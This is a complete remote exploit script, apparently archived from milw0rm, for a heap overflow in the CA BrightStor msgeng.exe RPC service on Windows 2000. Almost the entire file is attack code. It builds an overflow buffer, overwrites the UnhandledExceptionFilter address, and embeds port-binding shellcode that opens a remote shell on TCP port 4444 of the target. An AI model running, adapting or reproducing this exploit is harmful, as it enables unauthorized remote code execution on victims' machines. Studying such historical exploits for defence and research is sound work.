#!/usr/bin/python
# I couldnt find a reliable exploit for my analysis and so came up with this.
# Remote exploit for the CA BrightStor msgeng.exe service heap overflow
# vulnerability as described in LS-20060313.pdf on lssec.com. The exploit was
# tested on windows 2000 SP0. Opens a shell on TCP port 4444. Shouldnt be hard
# to port to other platforms. The exploit overwrites the
# UnhandledExceptionFilter in windows 2000 SP0 (located at 77EE044C) with the
# address of call dword ptr [esi +4C] located in user32.dll. At the time when
# UEF is called esi +4C contains a pointer to our shellcode.
#
# Winny M Thomas ;-)
# Author shall bear no responsibility for any screw ups caused by using this code

from impacket.dcerpc import transport, dcerpc
from impacket import uuid
import struct
import sys

def DCEconnectAndExploit(target):
       trans = transport.TCPTransport(target, 6503)
       trans.connect()
       dce = dcerpc.DCERPC_v5(trans)
       dce.bind(uuid.uuidtup_to_bin(('dc246bf0-7a7a-11ce-9f88-00805fe43838', '1.0')))

       request = "A" * 676
       request += "\x90\x90\x90\x90"
       request += "\x90\x90\xeb\x0a"

       #Call dword ptr [esi +4C] from user32.dll
       request += struct.pack("<L", 0x77E4FB7A)
       #Overwrite UnhandledExceptionFilter in Windows 2000 SP0
       request += struct.pack("<L", 0x77EE044C)
       request += "\x90\x90\x90\x90" * 2
       #Portbinding shellcode; Opens shell on TCP port 4444
       request += "\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe0"
       request += "\x6f\xe3\x2a\x83\xeb\xfc\xe2\xf4\x1c\x05\x08\x67\x08\x96\x1c\xd5"
       request += "\x1f\x0f\x68\x46\xc4\x4b\x68\x6f\xdc\xe4\x9f\x2f\x98\x6e\x0c\xa1"
       request += "\xaf\x77\x68\x75\xc0\x6e\x08\x63\x6b\x5b\x68\x2b\x0e\x5e\x23\xb3"
       request += "\x4c\xeb\x23\x5e\xe7\xae\x29\x27\xe1\xad\x08\xde\xdb\x3b\xc7\x02"
       request += "\x95\x8a\x68\x75\xc4\x6e\x08\x4c\x6b\x63\xa8\xa1\xbf\x73\xe2\xc1"
       request += "\xe3\x43\x68\xa3\x8c\x4b\xff\x4b\x23\x5e\x38\x4e\x6b\x2c\xd3\xa1"
       request += "\xa0\x63\x68\x5a\xfc\xc2\x68\x6a\xe8\x31\x8b\xa4\xae\x61\x0f\x7a"
       request += "\x1f\xb9\x85\x79\x86\x07\xd0\x18\x88\x18\x90\x18\xbf\x3b\x1c\xfa"
       request += "\x88\xa4\x0e\xd6\xdb\x3f\x1c\xfc\xbf\xe6\x06\x4c\x61\x82\xeb\x28"
       request += "\xb5\x05\xe1\xd5\x30\x07\x3a\x23\x15\xc2\xb4\xd5\x36\x3c\xb0\x79"
       request += "\xb3\x3c\xa0\x79\xa3\x3c\x1c\xfa\x86\x07\xf2\x76\x86\x3c\x6a\xcb"
       request += "\x75\x07\x47\x30\x90\xa8\xb4\xd5\x36\x05\xf3\x7b\xb5\x90\x33\x42"
       request += "\x44\xc2\xcd\xc3\xb7\x90\x35\x79\xb5\x90\x33\x42\x05\x26\x65\x63"
       request += "\xb7\x90\x35\x7a\xb4\x3b\xb6\xd5\x30\xfc\x8b\xcd\x99\xa9\x9a\x7d"
       request += "\x1f\xb9\xb6\xd5\x30\x09\x89\x4e\x86\x07\x80\x47\x69\x8a\x89\x7a"
       request += "\xb9\x46\x2f\xa3\x07\x05\xa7\xa3\x02\x5e\x23\xd9\x4a\x91\xa1\x07"
       request += "\x1e\x2d\xcf\xb9\x6d\x15\xdb\x81\x4b\xc4\x8b\x58\x1e\xdc\xf5\xd5"
       request += "\x95\x2b\x1c\xfc\xbb\x38\xb1\x7b\xb1\x3e\x89\x2b\xb1\x3e\xb6\x7b"
       request += "\x1f\xbf\x8b\x87\x39\x6a\x2d\x79\x1f\xb9\x89\xd5\x1f\x58\x1c\xfa"
       request += "\x6b\x38\x1f\xa9\x24\x0b\x1c\xfc\xb2\x90\x33\x42\x10\xe5\xe7\x75"
       request += "\xb3\x90\x35\xd5\x30\x6f\xe3\x2a"

       dce.call(43, request)

if __name__ == '__main__':
       try:
               target = sys.argv[1]
       except IndexError:
               print 'Usage: %s <target ip>\n' % sys.argv[0]
               sys.exit(-1)

       DCEconnectAndExploit(target)

# milw0rm.com [2007-01-27]